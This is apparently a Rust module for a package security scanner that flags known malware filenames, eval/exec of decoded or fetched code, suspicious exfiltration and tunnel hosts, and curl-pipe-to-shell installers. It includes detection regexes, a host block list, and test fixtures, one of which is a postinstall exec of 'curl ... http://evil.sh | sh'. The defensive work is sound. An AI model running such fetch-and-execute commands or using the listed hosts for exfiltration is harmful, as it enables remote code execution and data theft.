//! Source-pattern malware detector. Port of `source_patterns.go` +
//! `check_source_patterns.go`.
//!
//! Emits, over analyzable source files:
//!  - [`Capability::KnownMalwareIoc`] — confirmed IOC filenames;
//!  - [`Capability::ObfuscatedPayload`] — decode/fetch-then-exec (JS/Ruby/Python);
//!  - [`Capability::SuspiciousUrl`] — C2/exfil host or IDN homoglyph;
//!  - [`Capability::InstallHookSuspicious`] — `curl|sh` shell-fetcher.
//!
//! Every matcher runs over the raw body AND a split-string-collapsed
//! view (`"pas"+"tebin"` → `pastebin`) so concat obfuscation can't hide a
//! host or payload. R/Perl obfuscation variants are a follow-up (same
//! shape, different regex).

use std::sync::OnceLock;

use aegis_domain::Capability;
use regex::Regex;

use crate::source::is_analyzable_source;
use crate::NormalizedPackage;

const SCAN_CAP: usize = 256 * 1024;

/// Confirmed-malware IOC filenames (2026 Mini Shai-Hulud / TanStack).
const KNOWN_MALWARE_FILENAMES: &[&str] =
    &["router_init.js", "router_runtime.js", "tanstack_runner.js"];

fn re(s: &str) -> Regex {
    Regex::new(s).unwrap()
}

fn obfuscated_js() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"\b(?:eval|Function|require)\s*\(\s*(?:atob\s*\(|Buffer\s*\.\s*from\s*\([^)]*['"]base64['"]|decodeURIComponent\s*\(|unescape\s*\()"#)
    })
}
fn obfuscated_ruby() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"\beval\s*\(\s*(?:Net::HTTP\.(?:get|post)\s*\(|open\s*\(\s*['"]https?:|URI\.(?:open|read)\s*\()"#)
    })
}
fn obfuscated_python() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"\b(?:exec|eval)\s*\(\s*(?:urllib\.request\.urlopen\s*\(|urllib2\.urlopen\s*\(|(?:requests|httpx|aiohttp)\.(?:get|post)\s*\(|base64\.b64decode\s*\(|codecs\.decode\s*\(|compile\s*\(\s*base64\.)")
    })
}
fn shell_fetcher() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r"(?i)\b(?:curl|wget)\b[^|;\n]{0,300}\|\s*(?:ba|da|z|k)?sh\b"))
}
fn url_scheme() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r#"(?i)https?://[^\s"'`<>)]+"#))
}
fn concat_join() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r#"["']\s*\+\s*["']"#))
}

/// Host substrings that mark a URL as suspicious (C2 / exfil / tunnel).
const SUSPICIOUS_HOSTS: &[&str] = &[
    "pastebin.com",
    "hastebin.com",
    "paste.ee",
    "transfer.sh",
    "file.io",
    "0x0.st",
    "controlc.com",
    "justpaste.it",
    "ngrok.io",
    "ngrok-free.app",
    "trycloudflare.com",
    "loca.lt",
    "serveo.net",
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks",
    "api.telegram.org/bot",
    "hooks.slack.com/services",
    "cloudflare-dns.com/dns-query",
    "ipinfo.io",
    "ipify.org",
    "icanhazip.com",
    "ifconfig.me",
    "getsession.org",
];

fn ext(filename: &str) -> String {
    filename
        .rsplit_once('.')
        .map(|(_, e)| e.to_ascii_lowercase())
        .unwrap_or_default()
}

fn is_js_source(f: &str) -> bool {
    matches!(
        ext(f).as_str(),
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" | "cts" | "mts"
    )
}
fn is_ruby_source(f: &str) -> bool {
    matches!(ext(f).as_str(), "rb" | "gemspec")
}
fn is_python_source(f: &str) -> bool {
    matches!(ext(f).as_str(), "py" | "pyi" | "pyx")
}

fn is_known_malware_filename(filename: &str) -> bool {
    let base = filename
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(filename)
        .to_ascii_lowercase();
    KNOWN_MALWARE_FILENAMES.contains(&base.as_str())
}

/// Collapse `"a" + "b"` concat seams repeatedly (bounded). Mirrors
/// `deobfuscateConcat`.
fn deobfuscate_concat(body: &str) -> String {
    let mut body = body.to_string();
    for _ in 0..50 {
        let next = concat_join().replace_all(&body, "").into_owned();
        if next == body {
            break;
        }
        body = next;
    }
    body
}

/// The raw body plus, when a concat seam is present, a collapsed view.
/// Mirrors `concatVariants`.
fn concat_variants(body: &str) -> Vec<String> {
    if !concat_join().is_match(body) {
        vec![body.to_string()]
    } else {
        vec![body.to_string(), deobfuscate_concat(body)]
    }
}

fn contains_suspicious_url(text: &str) -> bool {
    for m in url_scheme().find_iter(text) {
        let url = m.as_str().to_lowercase();
        if SUSPICIOUS_HOSTS.iter().any(|h| url.contains(h)) || url.contains("xn--") {
            return true;
        }
    }
    false
}

/// Scan a package's files for the source-pattern signals.
pub fn check_source_patterns(pkg: &NormalizedPackage) -> Vec<Capability> {
    let (mut obfuscation, mut susp_url, mut shell_fetcher_hit, mut malware_ioc) =
        (false, false, false, false);

    for (filename, body) in &pkg.files {
        if !malware_ioc && is_known_malware_filename(filename) {
            malware_ioc = true;
        }
        if !is_analyzable_source(filename) {
            continue;
        }
        let slice = if body.len() > SCAN_CAP {
            &body[..SCAN_CAP]
        } else {
            &body[..]
        };
        let text = String::from_utf8_lossy(slice);

        for variant in concat_variants(&text) {
            if !susp_url && contains_suspicious_url(&variant) {
                susp_url = true;
            }
            if !obfuscation {
                let hit = (is_js_source(filename) && obfuscated_js().is_match(&variant))
                    || (is_ruby_source(filename) && obfuscated_ruby().is_match(&variant))
                    || (is_python_source(filename) && obfuscated_python().is_match(&variant));
                if hit {
                    obfuscation = true;
                }
            }
            if !shell_fetcher_hit && shell_fetcher().is_match(&variant) {
                shell_fetcher_hit = true;
            }
        }
        if obfuscation && susp_url && shell_fetcher_hit && malware_ioc {
            break;
        }
    }

    let mut out = Vec::new();
    if malware_ioc {
        out.push(Capability::KnownMalwareIoc);
    }
    if obfuscation {
        out.push(Capability::ObfuscatedPayload);
    }
    if susp_url {
        out.push(Capability::SuspiciousUrl);
    }
    if shell_fetcher_hit {
        out.push(Capability::InstallHookSuspicious);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_domain::Ecosystem;

    fn pkg(file: &str, body: &str) -> NormalizedPackage {
        NormalizedPackage::new("x", Ecosystem::Npm).with_file(file, body.as_bytes().to_vec())
    }

    #[test]
    fn detects_js_eval_atob() {
        let p = pkg("index.js", "eval(atob('ZXZpbA=='))");
        assert_eq!(
            check_source_patterns(&p),
            vec![Capability::ObfuscatedPayload]
        );
    }

    #[test]
    fn detects_suspicious_url() {
        let p = pkg("index.js", "fetch('https://pastebin.com/raw/abc')");
        assert_eq!(check_source_patterns(&p), vec![Capability::SuspiciousUrl]);
    }

    #[test]
    fn concat_collapse_defeats_split_host() {
        // "pas"+"tebin.com" hides pastebin from a naive substring match.
        let p = pkg("index.js", r#"const u = "https://pas"+"tebin.com/raw/x";"#);
        assert_eq!(check_source_patterns(&p), vec![Capability::SuspiciousUrl]);
    }

    #[test]
    fn detects_shell_fetcher_and_ioc_filename() {
        let p = NormalizedPackage::new("x", Ecosystem::Npm)
            .with_file(
                "postinstall.js",
                b"exec('curl -fsSL http://evil.sh | sh')".to_vec(),
            )
            .with_file("router_init.js", b"/* payload */".to_vec());
        let caps = check_source_patterns(&p);
        assert!(caps.contains(&Capability::KnownMalwareIoc));
        assert!(caps.contains(&Capability::InstallHookSuspicious));
    }

    #[test]
    fn idn_homoglyph_flagged() {
        let p = pkg("index.js", "fetch('https://xn--80ak6aa92e.com')");
        assert_eq!(check_source_patterns(&p), vec![Capability::SuspiciousUrl]);
    }

    #[test]
    fn python_exec_requests() {
        let p = pkg("setup.py", "exec(requests.get('http://x').text)");
        assert_eq!(
            check_source_patterns(&p),
            vec![Capability::ObfuscatedPayload]
        );
    }

    #[test]
    fn clean_source_empty() {
        let p = pkg("index.js", "export const sum = (a,b) => a+b;");
        assert!(check_source_patterns(&p).is_empty());
    }
}
